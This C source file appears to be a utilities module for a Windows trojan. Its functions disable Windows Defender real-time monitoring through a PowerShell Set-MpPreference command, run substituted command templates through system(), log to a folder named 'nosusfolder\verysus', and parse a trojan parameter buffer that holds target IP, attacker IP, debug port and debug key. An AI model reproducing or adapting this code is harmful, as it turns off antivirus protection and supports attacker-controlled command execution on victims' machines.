#include "utils.h"


RETURN_LAST RealTime(BOOL IsDisable) {
	RETURN_LAST LastError = { 0, ERROR_SUCCESS };
	const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\" > nul";
	const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\" > nul";
	if (IsDisable) {
		LastError.LastError = system(Disable);
	}
	else {
		LastError.LastError = system(Enable);
	}

	if (LastError.LastError == -1) {
		LastError.LastError = GetLastError();
		LastError.Represent = ERROR_GENERIC_COMMAND_FAILED;
		return LastError;
	}
	LastError.LastError = 0;
	return LastError;
}


int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
	int WideNameLen = MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, NULL, 0);
	MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, ConvertedString, WideNameLen);
	return WideNameLen;
}


int WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
	int MultiByteLen = WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, NULL, 0, NULL, NULL);
	WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, ConvertedString, MultiByteLen, NULL, NULL);
	return MultiByteLen;
}


void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
	int ii = 0;
	int repi = 0;
	int comi = 0;
	char TempWrite[500] = { 0 };

	HANDLE StatusHandle = CreateFileA("C:\\nosusfolder\\verysus\\replacevals.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	for (int i = 0; i <= strlen(BaseString); i++) {
		if (repi < Size && BaseString[i] == RepArr[repi].WhereTo) {
			memcpy((PVOID)((ULONG64)Output + comi), RepArr[repi].Replace, strlen(RepArr[repi].Replace) + 1);
			comi += strlen(RepArr[repi].Replace);

			RepArr[repi].RepCount -= 1;
			if (RepArr[repi].RepCount == 0) {
				repi++;
			}
		}
		else {
			Output[comi] = BaseString[i];
			Output[comi + 1] = '\0';
			comi++;
		}
		RtlZeroMemory(TempWrite, 500);
		memcpy(TempWrite, Output, strlen(Output) + 1);
		WriteFile(StatusHandle, TempWrite, strlen(TempWrite) + 1, NULL, NULL);
		WriteFile(StatusHandle, "\n", 1, NULL, NULL);
	}
	WriteFile(StatusHandle, Output, strlen(Output) + 1, NULL, NULL);
	WriteFile(StatusHandle, "final", 6, NULL, NULL);
	CloseHandle(StatusHandle);
}

DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
	char Command[500] = { 0 };
	ReplaceValues(BaseCommand, RepArr, Command, Size);
	if (system(Command) == -1) {
		return GetLastError();
	}
	return 0;
}


int ShowMessage(int Type, const char* Title, const char* Text) {
	return MessageBoxA(NULL, Text, Title, Type);
}


int CountOccurrences(const char* SearchStr, char SearchLetter) {
	DWORD Count = 0;
	for (int i = 0; i < strlen(SearchStr); i++) {
		if (SearchStr[i] == SearchLetter) {
			Count++;
		}
	}
	return Count;
}


int CheckLetterInArr(char Chr, const char* Arr) {
	for (int i = 0; i < strlen(Arr); i++) {
		if (Arr[i] == Chr) {
			return i;
		}
	}
	return -1;
}


BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
	int ActualSize = 1;
	int CurrRepIndex = 0;
	int ActualCommandIndex = 0;
	int SystemReturn = -1;

	for (int ci = 0; ci < CommandCount; ci++) {
		ActualSize += strlen(CommandArr[ci]);
		for (int si = 0; si < SymbolCount; si++) {
			ActualSize -= CountOccurrences(CommandArr[ci], Symbols[si]);
			for (int r = 0; r < CountOccurrences(CommandArr[ci], Symbols[si]); r++) {
				ActualSize += strlen(Replacements[si]);
			}
		}
	}

	char* ActualCommand = (char*)malloc(ActualSize);
	if (ActualCommand == NULL) {
		printf("malloc failed - %d\n", GetLastError());
		return FALSE;
	}

	for (int ci = 0; ci < CommandCount; ci++) {
		for (int cii = 0; cii < strlen(CommandArr[ci]); cii++) {
			CurrRepIndex = CheckLetterInArr(CommandArr[ci][cii], Symbols);
			if (CurrRepIndex == -1) {
				ActualCommand[ActualCommandIndex] = CommandArr[ci][cii];
				ActualCommandIndex++;
			}
			else {
				for (int ri = 0; ri < strlen(Replacements[CurrRepIndex]); ri++) {
					ActualCommand[ActualCommandIndex] = Replacements[CurrRepIndex][ri];
					ActualCommandIndex++;
				}
			}
		}
	}
	ActualCommand[ActualCommandIndex] = '\0';
	printf("Performed command: %s\n", ActualCommand);
	SystemReturn = system(ActualCommand);
	if (SystemReturn == -1) {
		free(ActualCommand);
		printf("Performed command returned -1 (error) - %d\n", GetLastError());
		return FALSE;
	}
	free(ActualCommand);
	printf("Performed command returned >= 0 (%d)\n", SystemReturn);
	return TRUE;
}


void ParseTrojanParams(LPVOID ParamBuffer, char* TargetIp, char* AttackerIp, char* DebugPort, char* DebugKey) {
	char CurrChar = 0;
	int CurrIndex = 0;
	int BufferIndex = 0;


	// Target IP address -
	while (((char*)ParamBuffer)[BufferIndex] != '~') {
		TargetIp[CurrIndex] = ((char*)ParamBuffer)[BufferIndex];
		CurrIndex++;
		BufferIndex++;
	}
	TargetIp[CurrIndex] = '\0';
	CurrIndex = 0;
	BufferIndex++;


	// Attacker IP address -
	while (((char*)ParamBuffer)[BufferIndex] != '~') {
		AttackerIp[CurrIndex] = ((char*)ParamBuffer)[BufferIndex];
		CurrIndex++;
		BufferIndex++;
	}
	AttackerIp[CurrIndex] = '\0';
	CurrIndex = 0;
	BufferIndex++;


	// Debug port -
	while (((char*)ParamBuffer)[BufferIndex] != '~') {
		DebugPort[CurrIndex] = ((char*)ParamBuffer)[BufferIndex];
		CurrIndex++;
		BufferIndex++;
	}
	DebugPort[CurrIndex] = '\0';
	CurrIndex = 0;
	BufferIndex++;


	// Debug key -
	while (BufferIndex <= strlen((char*)ParamBuffer)) {
		DebugKey[CurrIndex] = ((char*)ParamBuffer)[BufferIndex];
		CurrIndex++;
		BufferIndex++;
	}
}